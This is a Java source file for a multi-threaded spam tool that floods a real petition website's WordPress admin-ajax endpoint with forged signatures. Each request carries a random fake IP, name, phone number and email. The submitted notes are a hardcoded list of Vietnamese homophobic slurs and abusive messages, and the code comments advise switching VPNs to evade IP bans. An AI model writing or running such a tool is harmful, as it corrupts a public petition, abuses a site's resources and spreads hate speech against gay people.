package vn.giakhanhvn.networking;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.text.NumberFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

import sun.misc.Signal;
import sun.misc.SignalHandler;

public class DitMeToidongy {
	static int COUNTER = 0;
	static long STARTED = 0;
	static int READY = 0;
	static List<Thread> THREADS = new ArrayList<>();

	public static void main(String args[]) throws Exception {
		STARTED = System.currentTimeMillis();
		var scan = new Scanner(System.in);
		out("\n[BETA v0.1.2] PHAN MEM SPAM CHU KY toidongy.vn CHO LANG GOM TRI DO BALLS\n"
			+ "Author: Nguyen Gia Khanh (GiaKhanhVN)\n"
			+ "\n* Luu y: so luong Thread la so luong ma JVM\n"
			+ "se branch ra trong qua trinh spam, neu may tinh\n"
			+ "khoe thi co the dung tu 50-60 Threads, neu vua\n"
			+ "phai thi chi 10-20 threads la vua du!\n\n"
			+ "(-) Nhan CTRL + C de thoat khoi phan mem\n"
		);
		Signal.handle(new Signal("INT"), new SignalHandler() {
			@SuppressWarnings("deprecation")
			public void handle(Signal signal) {
				out("\n\n[SYS] Dang dung may ao Java! Session da gui tong cong " 
					+ COUNTER + " requests\nThoi gian chay cua session: " 
					+ ((System.currentTimeMillis() - STARTED) / 1000D) + "s\nBam Enter de thoat khoi phan mem!");
				suspendAllThreads();
				var a = new Scanner(System.in);
				a.close();
				Thread.currentThread().stop();
				return;
			}
		});
		System.out.print("=> Nhap so luong Thread: ");
		String inp;
		try {
			inp = scan.next();
		} catch (Exception e) {
			scan.close();
			return;
		}
		scan.close();
		int soLuongThread = 0;
		try {
			soLuongThread = Integer.parseInt(inp);
		}
		catch (NumberFormatException e) {
			out("[ERROR] May vua nhap cai cc gi vao day ha thg cho? Nhap 1 SO TU NHIEN VAO");
			out("[SYS] Chuong trinh dung lai trong 5s!");
			Thread.sleep(5000);
			System.exit(0);
			return;
		}
		if (soLuongThread <= 0 || soLuongThread > 1000) {
			out("[ERROR] So luong thread khong hop le! (Lon hon 0 va nho hon 1000)");
			out("[SYS] Chuong trinh dung lai trong 5s!");
			Thread.sleep(5000);
			System.exit(0);
			return;
		}
		
		out("\n[SYS] Dang khoi tao chuong trinh!\n[SYS] Luong thread se chay: " + soLuongThread + "\n");
		
		Thread.sleep(1000);
		// Logic chuong trinh
		for (int i = 0; i < soLuongThread; i++) {
			// Khoi dong 1 JVM thread moi
			final int a = i;
			final int b = soLuongThread;
			Thread thr = new Thread(() -> {
				// Moi 0.1s start 1 thread cho do
				// stress CPU
				try {
					Thread.sleep(a * 100);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
				READY++;
				out("[THREAD-SPAWN] Da khoi chay JVM Thread #" + Thread.currentThread().getId() + " thanh cong! (" + READY + "/" + b + ")");
				try {
					// Lien tuc spam exec
					do exec(); while (true);
				} catch (Exception e) {
					/* 
					 * Catch Exception (co the do web timeout
					 * hoac an ban-ip), co the dung VPN de tiep tuc
					*/
					out("[ERROR] Thread #" + Thread.currentThread().getId() + " da xay ra loi!\nStack Trace: "
					+ e.toString() + "\n  at " + e.getStackTrace()[0]);
					suspendAllThreads();
					try {
						Thread.sleep(10000);
						out("[SYS] Closing...");
						Thread.sleep(1000);
						System.exit(0);
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
			});
			THREADS.add(thr);
			thr.start();
		}
		
	}

	// Ham de generate ra 1 cai IP random (no co the trung vs ip cua m :))
	static String randIp() {
		var r = new Random();
		return r.nextInt(256) + "." + r.nextInt(256) 
		+ "." + r.nextInt(256) + "." + r.nextInt(256);
	}

	public static void exec() throws Exception {
		out("[LOG] Su dung Thread #" + Thread.currentThread().getId() + " va gui tap lenh POST Request...\n");
		var milis = System.currentTimeMillis();
		// Payload se gui den website (1 payload co ip bat ky)
		var randIp = DitMeToidongy.randIp();
		var randName = buildRandName();
		var randQuote = (random(0,1) == 1) ? randQuote() 
			: randString(random(20,30));
		var randPnum = randPhoneNum();
		var randMail = randMail();
		// tao 1 cai Payload
		var payload = "action=updateIpaddress&ipAddress={ip}&note_ido={quo}&phone_ido={pnum}&email_ido={rmai}&username_ido={name}"
				.replace("{ip}", randIp)
				.replace("{quo}", randQuote)
				.replace("{name}", randName)
				.replace("{pnum}", randPnum)
				.replace("{rmai}", randMail)
				.replace("{num}", String.valueOf(new Random().nextInt((99999 - 1000) + 1) + 1000));

		// Open connection bang Java HTTPClient
		var client = HttpClient.newHttpClient();
		// Build request Header va Payload
		var request = HttpRequest.newBuilder().uri(URI.create("https://toidongy.vn/wp-admin/admin-ajax.php"))
				.setHeader("X-Requested-With", "root")
				.setHeader("Accept", "application/json, text/javascript, /; q=0.01")
				.setHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8")
				.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8;")
				.setHeader("Cookie", "")
				.setHeader("Origin", "https://toidongy.vn/").setHeader("Referer", "https://toidongy.vn/")
				.setHeader("User-Agent",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54")
				.POST(HttpRequest.BodyPublishers.ofString(payload)).build();

		// Gui payload kem Header tu Client
		var res = client.send(request, HttpResponse.BodyHandlers.ofString());
		COUNTER++;
		try {
			out("[LOG] Thread #" + Thread.currentThread().getId() + " thuc hien xong! Ma Status: " + res.statusCode()
			+ "\n[LOG] Fake IP da dung: " + randIp + "\n[LOG] Thoi gian thuc hien: " + ((System.currentTimeMillis() - milis) / 1000D) + "s\n[LOG] Thuc hien lan thu: " + commaify(COUNTER) + "\n"
			+ "[LOG] Fake Name da dung: " + randName
			+ "\n[LOG] Quote da gui: " + randQuote
			+ "\n[LOG] SDT Fake da dung: " + randPnum
			+ "\n[LOG] Email Fake da dung: " + randMail
			+ "\n[LOG] Luong Don Da Submit: " + commaify(Long.parseLong(res.body().replace("{", "")
				.replace("}", "")
				.replace("\"success\":true,\"data\":\"", "")
				.replace("\"", ""))) + "\n"
			);
		}
		catch (NumberFormatException ex) {
			throw new RuntimeException("Web khong phan hoi POST!");
		}
		// Tam thoi sleep thread trong 3s cho do bi spam
		Thread.sleep(3000);
	}

	// Cac utils cho code gon gang hon
	static void out(Object a) {
		System.out.println(a);
	}
	
	private static final NumberFormat COMMA_FORMAT = NumberFormat.getInstance();
	public static String commaify(double d) {
		return COMMA_FORMAT.format(d);
	}
	
	public static int random(int min, int max) {
		if (min < 0) min = 0;
		if (max < 0) max = 0;
		return new Random().nextInt((max - min) + 1) + min;
	}
	
	static String randString(int targetStringLength) {
		int leftLimit = 97;
		int rightLimit = 122;
		var random = new Random();

		var generatedString = random.ints(leftLimit, rightLimit + 1)
			.limit(targetStringLength)
			.collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
			.toString();
		return generatedString;
	} 
	
	@SuppressWarnings("deprecation")
	static void suspendAllThreads() {
		THREADS.forEach(th -> th.stop());
	}
	
	// Cac thuat toan de generate cac thong tin random
	static String[] randNum = {
		"032","033","034","037","070","077"
		,"078","084","085","082","056","058","038",
		"090", "097", "096", "022"
	};
	static String[] randomNamePrefix = {
		"Lồn", "Cặc", "Buồi", "Rách", "Nổ",
		"Dái", "Cu", "Ngu", "Cẩu", "Khuyển",
		"Nguyễn", "Vũ", "Lê", "Trịnh", "Hà",
		"Hồ", "Vương", "Cà", "Lâu"
	};
	static String[] randomNameMiddle = {
		"Thị", "Tố", "Văn", "Tèo", "Xích",
		"Hà", "Xiên", "Mẹ", "Thuỳ", "Quốc",
		"Sinh", "Đài"
	};
	static String[] randomNameSuffix = {
		"Nổ", "Xéo", "Điên", "Sủi", "Dái", 
		"Cu", "Ngu", "Cẩu", "Khuyển", "Trưởng",
		"Sơn", "Hồ", "Vương", "Cà", "Linh", "La",
		"Đài"
	};
	static String[] quotes = {
		"Chúng bay làm loạn lên để đòi quyền duut deet nhau à?",
		"Mẹ tổ sư bố bọn gay",
		"Cứ ký đi, đéo ai nghe mày đâu, khóc to lên",
		"Đã duut deet nhau lại đòi quyền à, bố mày khinh",
		"Cút hết vào Gulag đi, lũ dị hợm",
		"Địt mẹ lũ gay",
		"Mẹ mày béo, à mà mày mô côi",
		"Thằng mất giống",
		"Mày được sinh ra bởi xì chây đấy thằng súc vật",
		"Chắc sau này chúng bay đòi đjt động vật chăng",
		"Lũ rẻ rách, bố mày khinh",
		"Địt mẹ lũ quái thai",
		"May là bố của mày không bị gay nên mày mới được đứng đây đó!",
		"Gửi thằng đang đọc database: thằng súc vật!",
		"Lũ đi ngược lại với tiến hoá",
		"Lũ chim ăn cứt bướm ăn lồn",
		"Cay cú à?",
		"Bọn vô lại làm loạn lên để đòi quyền duut deet nhau"
	};
	
	static String[] mailProvider = {
		"hotmail.ru",
		"gmail.com",
		"telegram.ru",
		"ussr.su",
		"nazi.ger",
		"applemail.com",
		"cummail.com",
		"the-atlas.",
		"email.ru",
		"quickmail.pl"
	};
		
	static String buildRandName() {
		StringBuilder sb = new StringBuilder(randomNamePrefix[random(0, randomNamePrefix.length - 1)]);
		sb.append(" ").append(
			randomNameMiddle[random(0, randomNameMiddle.length - 1)]
		);
		sb.append(" ").append(
			randomNameSuffix[random(0, randomNameSuffix.length - 1)]
		);
		return sb.toString();
	}
	
	static String randQuote() {
		return quotes[random(0, quotes.length - 1)];
	}
	
	static String randPhoneNum() {
		return randNum[random(0, randNum.length - 1)] 
			+ random(1, (int) Math.round(Math.pow(10, 7)));
	}
	
	static String randMail() {
		return randString(random(9,16)) 
			+ "@" + mailProvider[random(0, mailProvider.length - 1)];
	}
}
